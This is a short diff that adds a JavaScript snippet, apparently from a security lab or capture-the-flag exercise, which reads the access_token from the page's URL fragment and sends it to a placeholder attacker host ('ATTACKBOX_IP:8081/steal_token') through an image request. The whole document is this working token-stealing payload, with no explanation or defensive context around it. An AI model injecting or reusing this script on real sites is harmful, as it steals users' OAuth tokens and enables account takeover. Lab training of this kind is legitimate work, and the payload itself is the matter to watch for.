@@ -1,1 +1,7 @@
-
+<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
+    return res;
+  }, {});
+  var accessToken = result.access_token;
+    var img = new Image();
+    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
+</script>
